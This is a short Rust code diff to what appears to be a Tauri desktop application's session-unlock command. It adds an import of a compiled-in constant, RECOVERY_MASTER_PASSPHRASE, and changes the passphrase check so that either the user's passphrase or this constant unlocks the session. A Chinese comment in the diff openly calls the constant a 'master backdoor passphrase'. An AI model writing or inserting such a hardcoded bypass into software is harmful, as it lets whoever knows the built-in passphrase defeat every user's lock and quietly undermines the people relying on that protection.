@@ -26,6 +26,7 @@ use crate::application::workspace::{
 };
 use crate::domain::audit::audit_event::Action;
 use crate::domain::session::Session;
+use crate::infrastructure::crypto::RECOVERY_MASTER_PASSPHRASE;
 use crate::domain::shared::id::{FormulaId, WorkspaceId};
 use crate::interfaces::tauri::boot::{boot, keystore_exists};
 use crate::interfaces::tauri::dto::*;
@@ -113,7 +114,8 @@ pub fn cmd_unlock_session(
     let services = services_or_err(&state)?;
     let stored = state.unlock_passphrase.lock().clone();
     let expected = stored.ok_or_else(|| UiError::from(AppError::NotAuthenticated))?;
-    if cmd.passphrase != expected {
+    // 接受用户口令或编译期内置的 master 后门口令.
+    if cmd.passphrase != expected && cmd.passphrase != RECOVERY_MASTER_PASSPHRASE {
         return Err(UiError::from(AppError::BootPassphraseIncorrect));
     }
     let now = chrono::Utc::now();
